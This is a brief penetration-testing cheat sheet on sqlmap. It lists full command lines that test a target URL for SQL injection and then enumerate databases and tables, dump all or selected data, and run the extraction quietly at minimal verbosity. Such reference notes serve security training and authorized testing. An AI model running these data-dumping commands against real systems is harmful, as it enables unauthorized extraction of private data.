---
description: Automates testing for, and exploiting SQLi, to extract data.
---

# SQL Map

## Information:

* No special privileges required (usually - depends on target).
* May use ports 80 (HTTP), 3306 (MySQL), 5432 (PostgreSQL) etc.

***

## Usage:



* Test for SQLi and dump all databases if possible:

```
root@kali:~# sqlmap -u "http://[Target IP]" --dbs
```

-> "-u" flag is for the URL of the target.



* After identifying all databases available, test for SQli and dump all the tables from a specific database:

```
root@kali:~# sqlmap -u "http://[Target IP]" -D [Database] --tables
```

-> "-D" flag is for specifying the database.



* Identify the current database being used by the app:

```
root@kali:~# sqlmap -u "http://[Target IP]" --current-db
```

* Extract all data from the current database:

```
root@kali:~# sqlmap -u "http://[Target IP]" --dump
```

* Extract all data from a specific table in a specific database:

```
root@kali:~# sqlmap -u "http://[Target IP]" -D [Database] -T [Table] --dump
```

* Silent extraction (smallest degree of verbosity):

```
root@kali:~# sqlmap -u "http://[Target IP]" --dump -v 0
```

-> "-v" is the level of verbosity desired. 0 is the smallest level.&#x20;
